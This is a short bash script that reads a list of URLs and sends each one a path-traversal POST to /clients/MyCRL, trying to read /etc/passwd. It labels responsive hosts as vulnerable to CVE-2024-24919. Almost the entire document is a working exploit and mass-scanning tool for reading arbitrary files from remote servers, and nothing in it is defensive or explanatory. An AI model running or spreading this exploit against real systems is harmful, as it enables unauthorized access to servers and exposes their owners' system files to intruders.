#!/bin/bash
# Author: Gustavo Segundo - ByteNull%00

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
grayColour="\e[0;37m\033[1m"

if [ $# -eq 0 ]; then
    echo "Proporcioname un archivo con URLs"
    exit 1
fi

echo ""
while IFS= read -r domain; do
    payload="aCSHELL/../../../../../../../etc/passwd"

    response=$(curl -s -X POST -H "Content-Type: text/plain" -d "$payload" $domain/clients/MyCRL | sed '/^% Total/,/^100/d') 

    if [[ $response == *"admin"* ]]; then

    echo -e "${greenColour}[+] 
CVE-2024-24919
 - VULNERABLE -> ${grayColour} $domain ${endColour}"
    fi

done < "$1"
